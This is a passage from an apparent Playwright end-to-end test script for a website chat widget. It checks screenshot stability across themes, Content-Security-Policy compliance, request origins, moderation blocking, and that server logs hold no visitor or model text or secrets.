      await launcher(page).click();
      await floatDialog(page).waitFor({ state: 'visible', timeout: STATE_MS });
      await settled(page);
    }
    await ask(page, state.ask);
    await page.evaluate(() => document.fonts.ready);
    // The pointer away from everything (no hover state), nothing running, and two frames painted since.
    await page.mouse.move(0, 0);
    await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== 'running'), null, { timeout: STATE_MS });
    await page.evaluate(() => new Promise((done) => requestAnimationFrame(() => requestAnimationFrame(done))));
    const target = state.whole ? page : state.float ? floatDialog(page) : page.locator('[data-az-chat-transcript] > .az-chat-message--site').last();
    return await target.screenshot({ animations: 'disabled', caret: 'hide' });
  } finally {
    closed = (await closeWithin(ctx, CLOSE_MS, `snapshot ${state.name} close`)) && closed;
  }
}

async function snapshotFlow(b) {
  mkdirSync(SNAP_OUT, { recursive: true });
  const sha = (buf) => createHash('sha256').update(buf).digest('hex');
  for (const { theme, url } of themeHosts) {
    const unstable = [];
    const alike = [];
    for (const state of SNAP_STATES) {
      const byScheme = {};
      for (const scheme of ['light', 'dark']) {
        const first = await snapshot(b, url, scheme, state);
        const second = await snapshot(b, url, scheme, state);
        if (sha(first) !== sha(second)) {
          unstable.push(`${state.name} ${scheme}`);
          // Both kept, so the difference can be looked at.
          writeFileSync(join(SNAP_OUT, `${theme}-${scheme}-${state.name}.second.png`), second);
        }
        writeFileSync(join(SNAP_OUT, `${theme}-${scheme}-${state.name}.png`), first);
        byScheme[scheme] = sha(first);
      }
      if (byScheme.light === byScheme.dark) alike.push(state.name);
    }
    check(`snapshots, ${theme}: every answered state (${SNAP_STATES.map((x) => x.name).join(', ')}) renders byte-identically twice in each scheme`,
      unstable.length === 0, unstable.join(', '));
    check(`snapshots, ${theme}: light and dark differ in every answered state`, alike.length === 0, alike.join(', '));
  }
  console.log(`snapshots: ${themeHosts.length * SNAP_STATES.length * 2} PNGs in ${SNAP_OUT}`);
}

const errors = [];
try {
  for (const [name, engine] of [['chromium', chromium], ['firefox', firefox], ['webkit', webkit]]) {
    const b = await engine.launch();
    try {
      const caught = await violationControl(b, `${host.url}/az-policy-control/`, CONTROL_MS);
      check(`${name} CONTROL §2 B: the watch reports a page that breaks its policy`, !cspResult(caught).pass, caught[0] ?? 'nothing reported');
      const origins = new Set();
      await anonymousFlow(b, name, origins);
      await signedInFlow(b, name, origins);
      await componentsFlow(b, name, origins);
      await richFlow(b, name, origins);
      await floatFlow(b, name, origins);
      await moderationFlow(b, name, origins);
      await adminFlow(b, name, origins);
      const others = [...origins].filter((o) => o !== host.url && o !== backendOrigin);
      check(`${name}: every request went to the site or its backend — nothing else`, others.length === 0 && origins.has(backendOrigin), [...origins].join(' '));
      // Gate item 3's method, in the engine the gate's screenshots use.
      if (name === 'chromium') await snapshotFlow(b);
    } catch (e) {
      errors.push(`${name}: ${e.message.split('\n')[0]}`);
      check(`${name}: the flows ran to the end`, false, e.message.split('\n')[0]);
    } finally {
      closed = (await closeWithin(b, CLOSE_MS, `${name}.close`)) && closed;
    }
  }
  for (const engine of ['chromium', 'firefox', 'webkit']) {
    const { pass, detail } = cspResult(csp[engine] ?? []);
    check(`§2 B: no Content-Security-Policy violation on any page opened in ${engine}`, pass && engine in csp, detail || (engine in csp ? '' : 'no page was watched'));
  }
  check('the server logged answers (so the log was read)', /chat/i.test(serverLog), serverLog.split('\n').filter((l) => /chat/i.test(l)).slice(0, 2).join(' / '));
  check("the server's log holds no visitor's words and no model's words", !serverLog.includes(VISITOR_MARK) && !serverLog.includes(ANSWER_MARK)
    && !serverLog.includes('evil.example') && !serverLog.includes(PASSWORD) && !serverLog.includes('lumens') && !serverLog.includes('attack ')
    && !serverLog.includes('private-mark') && !serverLog.includes('Expected next quarter') && !serverLog.includes(GUIDE_SECRET)
    && !serverLog.includes('lifetime warranty'));
  check('the server logged the corpus\'s drops as counts and reasons only', /dropped \d+ \([a-z_,]+\)/.test(serverLog));
  check('the moderation hook was asked, and blocked once per engine', moderation.seen.asked > 0 && moderation.seen.blocked === ENGINES.length, JSON.stringify(moderation.seen));
  check('the server logged each block as a code, never the words', (serverLog.match(/chat: blocked by moderation/g) ?? []).length === ENGINES.length && !serverLog.includes(MODERATE_BLOCK));
} finally {
  child.kill('SIGTERM');
  proxy.close();
  for (const h of themeHosts) h.close();
  smtp.close();
  moderation.close();
}

console.log(failures === 0 ? '\nALL CHECKS PASSED' : `\n${failures} CHECK(S) FAILED — work dir kept: ${work}`);
if (failures === 0) rmSync(work, { recursive: true, force: true });
process.exitCode = failures === 0 ? 0 : 1;
run.clear();
if (!closed) process.exit();
